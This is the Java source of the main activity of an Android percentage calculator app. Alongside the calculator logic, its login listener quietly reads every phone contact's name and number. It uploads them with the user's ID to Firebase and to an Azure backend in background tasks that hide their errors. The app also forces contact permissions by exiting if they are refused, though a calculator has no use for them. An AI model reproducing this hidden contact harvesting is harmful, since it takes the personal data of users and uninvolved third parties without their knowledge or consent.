package com.nineinfosys.andrioddev5.percentagecalculator;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;

import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.andrioddev5.percentagecalculator.Login.Contacts;
import com.nineinfosys.andrioddev5.percentagecalculator.Login.LoginActivity;
import com.nineinfosys.andrioddev5.percentagecalculator.PercentageCalcualtor.PercentageCalculator;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;


public class MainActivityDrawer extends AppCompatActivity implements TextWatcher,View.OnClickListener {
    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name, email;
    public Toolbar toolbar;

    //designing tools declaration
    EditText edittextpercentageX1, edittextpercentageY1, edittextpercentageX2, edittextpercentageY2, edittextpercentageX3, edittextpercentageY3;
    TextView textViewvalueX1, textViewvalueY1, textViewAns1, textViewvalueX2, textViewvalueY2, textViewAns2, textViewvalueX3, textViewvalueY3, textViewAns3;
    LinearLayout linearLayoutOne, linearLayoutTwo, linearLayoutThree;
    Button buttonResetOne, buttonResetTwo, buttonResetThree;
    PercentageCalculator percentageCalculator;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        //firbase auth
        firebaseAuth=FirebaseAuth.getInstance();


        //keyboard hidden first time
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);
      //  profilePictureView = (ImageView) mNavigationView.getHeaderView(0).findViewById(R.id.imageView);

        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
        //  mFragmentTransaction.replace(R.id.containerView, new DashBord()).commit();

        //Linearlayout declaration
        linearLayoutOne = (LinearLayout) findViewById(R.id.percentageOnelayout);
        linearLayoutTwo = (LinearLayout) findViewById(R.id.percentageTwolayout);
        linearLayoutThree = (LinearLayout) findViewById(R.id.percentagethirdlayout);

        //declaration of layout tools
        edittextpercentageX1 = (EditText) findViewById(R.id.edittextpercentageX1);
        edittextpercentageY1 = (EditText) findViewById(R.id.edittextpercentageY1);
        edittextpercentageX2 = (EditText) findViewById(R.id.edittextpercentageX2);
        edittextpercentageY2 = (EditText) findViewById(R.id.edittextpercentageY2);
        edittextpercentageX3 = (EditText) findViewById(R.id.edittextpercentageX3);
        edittextpercentageY3 = (EditText) findViewById(R.id.edittextpercentageY3);
        textViewvalueX1 = (TextView) findViewById(R.id.textViewvaluex1);
        textViewvalueY1 = (TextView) findViewById(R.id.textViewvaluey1);
        textViewAns1 = (TextView) findViewById(R.id.textViewAnswer1);
        textViewvalueX2 = (TextView) findViewById(R.id.textViewvaluex2);
        textViewvalueY2 = (TextView) findViewById(R.id.textViewvaluey2);
        textViewAns2 = (TextView) findViewById(R.id.textViewAnswer2);
        textViewvalueX3 = (TextView) findViewById(R.id.textViewvaluex3);
        textViewvalueY3 = (TextView) findViewById(R.id.textViewvaluey3);
        textViewAns3 = (TextView) findViewById(R.id.textViewAnswer3);
        buttonResetOne = (Button) findViewById(R.id.buttonPerecentReset1);
        buttonResetTwo = (Button) findViewById(R.id.buttonPerecentReset2);
        buttonResetThree = (Button) findViewById(R.id.buttonPerecentReset3);

        edittextpercentageX1.addTextChangedListener(this);
        edittextpercentageY1.addTextChangedListener(this);
        edittextpercentageX2.addTextChangedListener(this);
        edittextpercentageY2.addTextChangedListener(this);
        edittextpercentageX3.addTextChangedListener(this);
        edittextpercentageY3.addTextChangedListener(this);

        buttonResetOne.setOnClickListener(this);
        buttonResetTwo.setOnClickListener(this);
        buttonResetThree.setOnClickListener(this);
        /**
         * Setup click events on the Navigation View Items.
         */

        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();

                if (menuItem.getItemId() == R.id.PercentageCalcualtor) {
                    /*FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new IdealWeightFragment()).commit();*/
                    Intent intent = new Intent(MainActivityDrawer.this, MainActivityDrawer.class);
                    finish();
                    startActivity(intent);
                }


                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP")));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP")));
                    }
                }

                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
                    finish();
                    startActivity(intent);


                }




                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }


                }


                return false;
            }


        });

        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();

        authenticate();
    }


    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }



    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();

        }

        return super.onOptionsItemSelected(item);
    }


    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:

                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }

    @Override
    public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

    }

    @Override
    public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

        double percentageX1, percentageY1, percentageX2, percentageY2, percentageX3, percentageY3;
        double resultOne, resultTwo, resultThree;

        //first percentage calculation
        try {
            percentageX1 = Double.parseDouble(edittextpercentageX1.getText().toString());
            percentageY1 = Double.parseDouble(edittextpercentageY1.getText().toString());

            //call percentagecalculator class for calculation
            percentageCalculator = new PercentageCalculator(percentageX1, percentageY1);
            resultOne = percentageCalculator.percentCalculateOne();

            //setting alue to textview
            linearLayoutOne.setVisibility(View.VISIBLE);
            textViewvalueX1.setText(Double.toString((double) percentageX1));
            textViewvalueY1.setText(Double.toString((double) percentageY1));
            textViewAns1.setText(Double.toString((double) resultOne));

        } catch (NumberFormatException e) {
            resultOne = 0;

        }

        //second percentage calculation
        try {
            percentageX2 = Double.parseDouble(edittextpercentageX2.getText().toString());
            percentageY2 = Double.parseDouble(edittextpercentageY2.getText().toString());
            //call percentagecalculator class for calculation
            percentageCalculator = new PercentageCalculator(percentageX2, percentageY2);
            resultTwo = percentageCalculator.percentCalculateTwo();

            //setting alue to textview
            linearLayoutTwo.setVisibility(View.VISIBLE);
            textViewvalueX2.setText(Double.toString((double) percentageX2));
            textViewvalueY2.setText(Double.toString((double) percentageY2));
            textViewAns2.setText(Double.toString((double) resultTwo));

        } catch (NumberFormatException e) {
            resultOne = 0;

        }

        //Third percentage calculation
        try {
            percentageX3 = Double.parseDouble(edittextpercentageX3.getText().toString());
            percentageY3 = Double.parseDouble(edittextpercentageY3.getText().toString());
            //call percentagecalculator class for calculation
            percentageCalculator = new PercentageCalculator(percentageX3, percentageY3);
            resultTwo = percentageCalculator.percentCalculateThree();

            //setting alue to textview
            linearLayoutThree.setVisibility(View.VISIBLE);
            textViewvalueX3.setText(Double.toString((double) percentageX3));
            textViewvalueY3.setText(Double.toString((double) percentageY3));
            textViewAns3.setText(Double.toString((double) resultTwo));

        } catch (NumberFormatException e) {
            resultOne = 0;

        }


    }

    @Override
    public void afterTextChanged(Editable editable) {

    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.buttonPerecentReset1:
                edittextpercentageX1.setText(null);
                edittextpercentageY1.setText(null);
                linearLayoutOne.setVisibility(View.GONE);
                break;
            case R.id.buttonPerecentReset2:
                edittextpercentageX2.setText(null);
                edittextpercentageY2.setText(null);
                linearLayoutTwo.setVisibility(View.GONE);
                break;
            case R.id.buttonPerecentReset3:
                edittextpercentageX3.setText(null);
                edittextpercentageY3.setText(null);
                linearLayoutThree.setVisibility(View.GONE);
                break;

        }
    }
}